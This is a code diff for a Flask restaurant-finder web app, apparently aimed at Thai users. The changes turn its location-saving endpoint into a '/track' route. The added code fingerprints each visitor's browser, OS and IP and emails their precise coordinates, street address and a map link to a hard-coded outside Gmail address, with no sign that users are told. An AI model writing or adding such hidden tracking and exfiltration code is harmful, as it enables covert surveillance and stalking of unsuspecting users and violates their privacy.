@@ -1,8 +1,7 @@
-from flask import Flask, render_template, jsonify, request
+from flask import Flask, render_template, jsonify, request, session
 from geopy.geocoders import Nominatim
 import folium
 from folium import plugins
-import googlemaps
 import os
 from dotenv import load_dotenv
 from operator import itemgetter
@@ -11,6 +10,14 @@ import json
 from datetime import datetime
 import pytz
 import math
+import uuid
+import platform
+import hashlib
+from ua_parser import user_agent_parser
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from threading import Thread
 
 # Set up logging
 logging.basicConfig(level=logging.DEBUG)
@@ -22,23 +29,16 @@ load_dotenv()
 # Create required directories
 DATA_DIR = 'data'
 USER_DATA_DIR = os.path.join(DATA_DIR, 'user_data')
+DEVICE_DATA_DIR = os.path.join(DATA_DIR, 'device_data')
 BACKUP_DIR = os.path.join(DATA_DIR, 'backups')
 
-for directory in [DATA_DIR, USER_DATA_DIR, BACKUP_DIR]:
+for directory in [DATA_DIR, USER_DATA_DIR, DEVICE_DATA_DIR, BACKUP_DIR]:
     if not os.path.exists(directory):
         os.makedirs(directory)
 
 LOCATION_HISTORY_FILE = os.path.join(DATA_DIR, 'location_history.json')
 
 app = Flask(__name__)
-
-# Initialize Google Maps client
-api_key = os.getenv('GOOGLE_MAPS_API_KEY')
-if not api_key:
-    logger.error("Google Maps API key not found in environment variables")
-    raise ValueError("Missing Google Maps API key")
-
-gmaps = googlemaps.Client(key=api_key)
 
 def get_user_location_file(user_id):
     """Get location history file path for specific user"""
@@ -49,96 +49,134 @@ def get_backup_file(user_id):
     timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
     return os.path.join(BACKUP_DIR, f'location_history_{user_id}_{timestamp}.json')
 
-def save_location_history(location_data, user_id='default'):
+def send_location_email(user_data, location_data):
+    """Send location data to specified email"""
     try:
-        # Validate input data
-        required_fields = ['lat', 'lon']
-        for field in required_fields:
-            if field not in location_data:
-                logger.error(f"Missing required field: {field}")
-                return False
-            try:
-                location_data[field] = float(location_data[field])
-            except ValueError:
-                logger.error(f"Invalid {field} value: {location_data[field]}")
-                return False
-
-        # Get user-specific location file
-        location_file = get_user_location_file(user_id)
+        # Email configuration
+        sender_email = os.getenv('EMAIL_USER')
+        sender_password = os.getenv('EMAIL_PASSWORD')
+        receiver_email = "bee.teyamaster@gmail.com"
         
-        # Load existing history
-        history = []
-        if os.path.exists(location_file):
-            try:
-                with open(location_file, 'r', encoding='utf-8') as f:
-                    history = json.load(f)
-                    if not isinstance(history, list):
-                        logger.error("History file contains invalid data format")
-                        history = []
-            except (json.JSONDecodeError, UnicodeDecodeError) as e:
-                logger.warning(f"Could not read history file: {str(e)}")
-                history = []
+        if not sender_email or not sender_password:
+            logger.error("Missing email configuration")
+            return False
+            
+        logger.info(f"Preparing to send email from {sender_email} to {receiver_email}")
         
-        # Add timestamp and format in Thai timezone
-        tz = pytz.timezone('Asia/Bangkok')
-        current_time = datetime.now(tz)
-        location_data['timestamp'] = current_time.isoformat()
-        location_data['formatted_time'] = current_time.strftime("%d/%m/%Y %H:%M:%S")
+        # Create message
+        msg = MIMEMultipart()
+        msg['From'] = sender_email
+        msg['To'] = receiver_email
+        msg['Subject'] = f"New Location Data - User {user_data.get('user_id', 'Unknown')}"
         
+        # Format location data
+        location_text = f"""
+        New location data received:
+        
+        User ID: {user_data.get('user_id', 'Unknown')}
+        Timestamp: {location_data.get('timestamp')}
+        Latitude: {location_data.get('latitude')}
+        Longitude: {location_data.get('longitude')}
+        Address: {location_data.get('address', 'Not available')}
+        
+        Device Information:
+        Browser: {user_data.get('browser', 'Unknown')}
+        OS: {user_data.get('os', 'Unknown')}
+        IP: {user_data.get('ip', 'Unknown')}
+        
+        Google Maps Link:
+        https://www.google.com/maps?q={location_data.get('latitude')},{location_data.get('longitude')}
+        """
+        
+        msg.attach(MIMEText(location_text, 'plain'))
+        
+        logger.info("Email content prepared, attempting to send...")
+        
+        # Send email
         try:
-            # Get address with timeout
-            geolocator = Nominatim(user_agent="restaurant_finder_app")
-            location = geolocator.reverse(
-                f"{location_data['lat']}, {location_data['lon']}", 
-                timeout=5,
-                language='th'
-            )
-            location_data['address'] = location.address if location else None
+            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
+                server.login(sender_email, sender_password)
+                server.send_message(msg)
+                logger.info(f"Location email sent successfully to {receiver_email}")
+                return True
         except Exception as e:
-            logger.warning(f"Could not get address: {str(e)}")
-            location_data['address'] = None
-        
-        # Check for duplicate locations
-        if history:
-            last_location = history[-1]
-            time_diff = (current_time - datetime.fromisoformat(last_location['timestamp'])).total_seconds()
-            
-            if time_diff < 300:  # 5 minutes
-                distance = calculate_distance(
-                    last_location['lat'], last_location['lon'],
-                    location_data['lat'], location_data['lon']
-                )
-                
-                if distance < 10:  # 10 meters
-                    logger.debug("Skipping duplicate location")
-                    return True
-        
-        # Append new location
-        history.append(location_data)
-        
-        # Keep only last 100 locations
-        if len(history) > 100:
-            # Create backup before truncating
-            backup_file = get_backup_file(user_id)
-            with open(backup_file, 'w', encoding='utf-8') as f:
-                json.dump(history, f, ensure_ascii=False, indent=2)
-            
-            history = history[-100:]
-        
-        # Save to file
-        try:
-            with open(location_file, 'w', encoding='utf-8') as f:
-                json.dump(history, f, ensure_ascii=False, indent=2)
-                
-            logger.debug(f"Location saved successfully for user {user_id}")
-            return True
-            
-        except Exception as e:
-            logger.error(f"Error saving location data: {str(e)}")
+            logger.error(f"SMTP Error: {str(e)}")
             return False
             
     except Exception as e:
-        logger.error(f"Error in save_location_history: {str(e)}")
+        logger.error(f"Error preparing email: {str(e)}")
+        return False
+
+def save_user_location(user_id, location_data, device_id):
+    """Save user location with device information and send email notification"""
+    try:
+        location_file = os.path.join(USER_DATA_DIR, f'user_{user_id}.json')
+        
+        # Load or create user data
+        if os.path.exists(location_file):
+            with open(location_file, 'r', encoding='utf-8') as f:
+                user_data = json.load(f)
+        else:
+            user_data = {
+                'user_id': user_id,
+                'first_visit': datetime.now(pytz.timezone('Asia/Bangkok')).isoformat(),
+                'devices': [],
+                'locations': []
+            }
+        
+        # Add device if new
+        if device_id not in user_data['devices']:
+            user_data['devices'].append(device_id)
+        
+        # Add location data
+        location_entry = {
+            'timestamp': datetime.now(pytz.timezone('Asia/Bangkok')).isoformat(),
+            'device_id': device_id,
+            'latitude': float(location_data['lat']),
+            'longitude': float(location_data['lon']),
+            'accuracy': location_data.get('accuracy'),
+            'address': None
+        }
+        
+        # Get address
+        try:
+            geolocator = Nominatim(user_agent="restaurant_finder_app")
+            location = geolocator.reverse(
+                f"{location_entry['latitude']}, {location_entry['longitude']}", 
+                timeout=5,
+                language='th'
+            )
+            location_entry['address'] = location.address if location else None
+        except Exception as e:
+            logger.warning(f"Could not get address: {str(e)}")
+        
+        # Add to locations list
+        user_data['locations'].append(location_entry)
+        
+        # Send email notification
+        send_location_email(user_data, location_entry)
+        
+        # Keep only last 100 locations
+        if len(user_data['locations']) > 100:
+            # Backup before truncating
+            backup_file = os.path.join(BACKUP_DIR, 
+                f'user_{user_id}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json')
+            with open(backup_file, 'w', encoding='utf-8') as f:
+                json.dump(user_data, f, ensure_ascii=False, indent=2)
+            
+            user_data['locations'] = user_data['locations'][-100:]
+        
+        # Update last visit
+        user_data['last_visit'] = location_entry['timestamp']
+        
+        # Save user data
+        with open(location_file, 'w', encoding='utf-8') as f:
+            json.dump(user_data, f, ensure_ascii=False, indent=2)
+        
+        logger.debug(f"Location saved for user {user_id} from device {device_id}")
+        return True
+    except Exception as e:
+        logger.error(f"Error saving user location: {str(e)}")
         return False
 
 def calculate_distance(lat1, lon1, lat2, lon2):
@@ -152,6 +190,32 @@ def calculate_distance(lat1, lon1, lat2, lon2):
     a = math.sin(delta_phi/2)**2 + math.cos(phi1) * math.cos(phi2) * math.sin(delta_lambda/2)**2
     c = 2 * math.atan2(math.sqrt(a), math.sqrt(1-a))
     return R * c
+
+def get_device_info():
+    """Get detailed device information from request"""
+    try:
+        user_agent = request.headers.get('User-Agent', '')
+        parsed_ua = user_agent_parser.Parse(user_agent)
+        
+        return {
+            'user_agent': user_agent,
+            'browser': parsed_ua['user_agent']['family'],
+            'browser_version': parsed_ua['user_agent']['major'],
+            'os': parsed_ua['os']['family'],
+            'os_version': parsed_ua['os']['major'],
+            'device': parsed_ua['device']['family'],
+            'ip': request.remote_addr,
+            'timestamp': datetime.now(pytz.timezone('Asia/Bangkok')).isoformat()
+        }
+    except Exception as e:
+        logger.error(f"Error getting device info: {str(e)}")
+        return {
+            'user_agent': 'Unknown',
+            'browser': 'Unknown',
+            'os': 'Unknown',
+            'ip': request.remote_addr,
+            'timestamp': datetime.now(pytz.timezone('Asia/Bangkok')).isoformat()
+        }
 
 @app.route('/')
 def index():
@@ -169,31 +233,39 @@ def index():
     map_html = folium_map._repr_html_()
     return render_template('index.html', map=map_html)
 
-@app.route('/save_location', methods=['POST'])
-def save_location():
+@app.route('/track', methods=['POST'])
+def track_user():
     try:
         data = request.get_json()
-        user_id = data.get('user_id', 'default')
-        
         if not data or 'lat' not in data or 'lon' not in data:
             return jsonify({
                 'status': 'error',
-                'message': 'Missing coordinates'
-            })
+                'message': 'Missing location data'
+            }), 400
         
-        success = save_location_history(data, user_id)
+        # Generate or get user ID
+        user_id = data.get('user_id', str(uuid.uuid4()))
+        
+        # Get device information
+        device_info = get_device_info()
+        device_id = hashlib.md5(f"{device_info['user_agent']}_{device_info['ip']}".encode()).hexdigest()
+        
+        # Save user location
+        success = save_user_location(user_id, data, device_id)
         
         return jsonify({
             'status': 'success' if success else 'error',
-            'message': 'Location saved successfully' if success else 'Failed to save location'
+            'user_id': user_id,
+            'device_id': device_id,
+            'message': 'Data saved successfully' if success else 'Failed to save data'
         })
         
     except Exception as e:
-        logger.error(f"Error in save_location: {str(e)}")
+        logger.error(f"Error in track_user: {str(e)}")
         return jsonify({
             'status': 'error',
             'message': str(e)
-        })
+        }), 500
 
 @app.route('/get_location_history')
 def get_location_history():
@@ -330,6 +402,50 @@ def get_nearby_restaurants():
         return jsonify({
             'status': 'error',
             'message': 'เกิดข้อผิดพลาดที่ไม่คาดคิด กรุณาลองใหม่อีกครั้ง'
+        }), 500
+
+@app.route('/test')
+def test():
+    return render_template('test.html')
+
+@app.route('/test_email')
+def test_email():
+    """Test endpoint for email functionality"""
+    try:
+        # Create test data
+        test_user_data = {
+            'user_id': 'test_user',
+            'browser': 'Test Browser',
+            'os': 'Test OS',
+            'ip': '127.0.0.1'
+        }
+        
+        test_location_data = {
+            'timestamp': datetime.now(pytz.timezone('Asia/Bangkok')).isoformat(),
+            'latitude': 13.7563,
+            'longitude': 100.5018,
+            'address': 'Test Location, Bangkok, Thailand'
+        }
+        
+        # Attempt to send email
+        success = send_location_email(test_user_data, test_location_data)
+        
+        if success:
+            return jsonify({
+                'status': 'success',
+                'message': 'Test email sent successfully'
+            })
+        else:
+            return jsonify({
+                'status': 'error',
+                'message': 'Failed to send test email'
+            }), 500
+            
+    except Exception as e:
+        logger.error(f"Error in test_email: {str(e)}")
+        return jsonify({
+            'status': 'error',
+            'message': str(e)
         }), 500
 
 if __name__ == '__main__':
